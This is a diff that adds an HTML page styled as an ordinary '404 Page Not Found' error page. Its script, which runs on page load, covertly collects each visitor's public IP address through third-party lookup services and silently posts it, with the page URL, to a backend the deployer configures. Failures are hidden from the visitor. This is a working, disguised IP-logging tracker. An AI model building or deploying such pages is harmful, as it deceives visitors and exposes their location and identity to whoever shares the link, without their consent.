@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 - Page Not Found</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+
+        .container {
+            text-align: center;
+            padding: 2rem;
+        }
+
+        .error-code {
+            font-size: 10rem;
+            font-weight: bold;
+            text-shadow: 4px 4px 8px rgba(0, 0, 0, 0.3);
+            margin-bottom: 1rem;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .error-message {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .error-description {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 2rem;
+        }
+
+        .back-link {
+            display: inline-block;
+            padding: 1rem 2rem;
+            background: rgba(255, 255, 255, 0.2);
+            border: 2px solid white;
+            border-radius: 50px;
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .back-link:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+        }
+
+        .icon {
+            font-size: 5rem;
+            margin-bottom: 1rem;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="icon">🔍</div>
+        <div class="error-code">404</div>
+        <div class="error-message">Page Not Found</div>
+        <div class="error-description">
+            The page you are looking for might have been removed,<br>
+            had its name changed, or is temporarily unavailable.
+        </div>
+        <a href="/" class="back-link">Go Back Home</a>
+    </div>
+
+    <script>
+        // **IMPORTANT**: Replace this URL with your deployed backend URL
+        // Examples:
+        // - Render: 'https://your-app.onrender.com/log'
+        // - Railway: 'https://your-app.railway.app/log'
+        // - Heroku: 'https://your-app.herokuapp.com/log'
+        const BACKEND_URL = 'REPLACE_WITH_YOUR_BACKEND_URL/log';
+
+        // Fetch public IP address and log the visit
+        async function logVisit() {
+            let publicIP = null;
+
+            // Try multiple IP detection services for better reliability
+            const ipServices = [
+                'https://api.ipify.org?format=json',
+                'https://api64.ipify.org?format=json',
+                'https://api.my-ip.io/ip.json',
+                'https://ipapi.co/json/'
+            ];
+
+            // Try each service until one works
+            for (const service of ipServices) {
+                try {
+                    const response = await fetch(service, { timeout: 5000 });
+                    const data = await response.json();
+
+                    // Different services return IP in different field names
+                    publicIP = data.ip || data.IP || data.query;
+
+                    if (publicIP) {
+                        break; // Got IP, stop trying other services
+                    }
+                } catch (error) {
+                    continue;
+                }
+            }
+
+            // Send to backend
+            try {
+                // Use the backend URL if configured, otherwise try relative path (for local testing)
+                const logUrl = BACKEND_URL.includes('REPLACE_WITH') ? '/log' : BACKEND_URL;
+
+                await fetch(logUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        ip: publicIP,
+                        url: window.location.href
+                    })
+                });
+            } catch (error) {
+                // Silently fail if logging doesn't work
+            }
+        }
+
+        // Execute when page loads
+        logVisit();
+    </script>
+</body>
+
+</html>
